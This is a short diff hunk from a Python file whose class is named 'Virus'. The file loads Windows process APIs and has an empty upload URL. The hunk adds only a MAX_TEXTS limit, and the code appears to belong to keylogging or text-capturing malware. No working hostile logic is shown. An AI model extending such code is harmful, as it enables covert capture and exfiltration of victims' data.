@@ -25,3 +25,4 @@ psapi = ctypes.WinDLL("psapi")
 class Virus(object):
     UPLOAD_URL = ""
     MAX_LAST_PRESS = 5
+    MAX_TEXTS = 1500
